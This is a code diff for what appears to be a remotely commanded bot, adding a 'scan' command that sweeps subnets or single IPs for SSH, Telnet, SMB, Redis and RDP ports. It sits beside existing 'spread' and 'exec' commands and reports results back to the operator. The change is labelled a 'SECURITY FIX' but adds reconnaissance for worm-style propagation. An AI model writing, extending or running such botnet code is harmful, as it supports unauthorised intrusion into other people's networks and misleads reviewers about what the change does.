@@ -1528,7 +1528,64 @@ int protocol_process_commands(notnet_bot_t *bot) {
                 log_info("CMD: spread invalid format, use target:port");
             }
         } else if (strncmp(cmd, CMD_SCAN, strlen(CMD_SCAN)) == 0) {
-            log_info("CMD: scan");
+            /* SECURITY FIX (#68/#79): Implement scan. Syntax:
+             *   scan <subnet>            -> scan subnet (e.g. 192.168.1.0/24)
+             *   scan <ip>:<port,...>     -> scan specific ports on one IP
+             *   scan <ip>                -> scan default ports on one IP
+             * Results are returned via protocol_send_response(). */
+            char *args = cmd + strlen(CMD_SCAN);
+            while (*args == ' ' || *args == '\t') args++;
+
+            if (args[0] == '\0') {
+                protocol_send_response(bot, CMD_SCAN,
+                    "scan: usage 'scan <subnet>' or 'scan <ip>[:<port,...>]'");
+            } else if (strchr(args, '/')) {
+                /* Subnet scan using the configured service mask */
+                uint8_t all_services = SPREAD_SSH | SPREAD_TELNET | SPREAD_SMB | SPREAD_REDIS | SPREAD_RDP;
+                if (scan_subnet(bot, args, all_services) == 0) {
+                    protocol_send_response(bot, CMD_SCAN, "scan: subnet complete");
+                } else {
+                    protocol_send_response(bot, CMD_SCAN, "scan: invalid subnet");
+                }
+            } else {
+                /* Single IP: optional explicit port list, else defaults */
+                static const uint16_t default_ports[] = { 22, 23, 445, 6379, 3389 };
+                char *ports_str = strchr(args, ':');
+                uint16_t ports[16];
+                int port_count = 0;
+                char target_ip[64] = {0};
+
+                if (ports_str) {
+                    int ilen = (int)(ports_str - args);
+                    if (ilen > 63) ilen = 63;
+                    memcpy(target_ip, args, ilen);
+                    target_ip[ilen] = '\0';
+                    /* parse comma-separated ports */
+                    char *saveptr = NULL;
+                    char *tok = strtok_r(ports_str + 1, ",", &saveptr);
+                    while (tok && port_count < 16) {
+                        int p = atoi(tok);
+                        if (p > 0 && p <= 65535) ports[port_count++] = (uint16_t)p;
+                        tok = strtok_r(NULL, ",", &saveptr);
+                    }
+                    if (port_count == 0) {
+                        protocol_send_response(bot, CMD_SCAN, "scan: no valid ports");
+                        continue;
+                    }
+                } else {
+                    snprintf(target_ip, sizeof(target_ip), "%.63s", args);
+                    port_count = (int)(sizeof(default_ports) / sizeof(default_ports[0]));
+                    memcpy(ports, default_ports, sizeof(default_ports));
+                }
+
+                char *result = scan_ports(target_ip, ports, port_count);
+                if (result) {
+                    protocol_send_response(bot, CMD_SCAN, result);
+                    free(result);
+                } else {
+                    protocol_send_response(bot, CMD_SCAN, "scan: error");
+                }
+            }
         } else if (strncmp(cmd, CMD_EXEC, strlen(CMD_EXEC)) == 0) {
             /* SECURITY: exec replaced popen() with a strict allowlist + execve().
              * Only commands in the allowlist are permitted. The command name
